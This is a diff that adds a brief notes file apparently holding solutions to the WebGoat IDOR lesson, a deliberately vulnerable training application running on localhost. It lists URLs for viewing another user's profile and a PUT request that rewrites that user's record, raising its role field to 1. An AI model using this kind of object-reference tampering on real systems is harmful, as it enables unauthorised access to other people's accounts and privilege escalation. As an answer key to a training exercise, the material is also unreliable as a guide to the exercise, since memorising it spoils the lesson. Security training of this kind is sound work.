@@ -1,0 +1,12 @@
+http://localhost:8080/WebGoat/IDOR/profile/2342384
+
+http://localhost:8080/WebGoat/IDOR/profile/2342388
+
+PUT http://localhost:8080/WebGoat/IDOR/profile/2342388
+{
+ "role": 1,
+ "color": "red",
+ "size": "large",
+ "name": "Buffalo Bill",
+ "userId": 2342388
+}
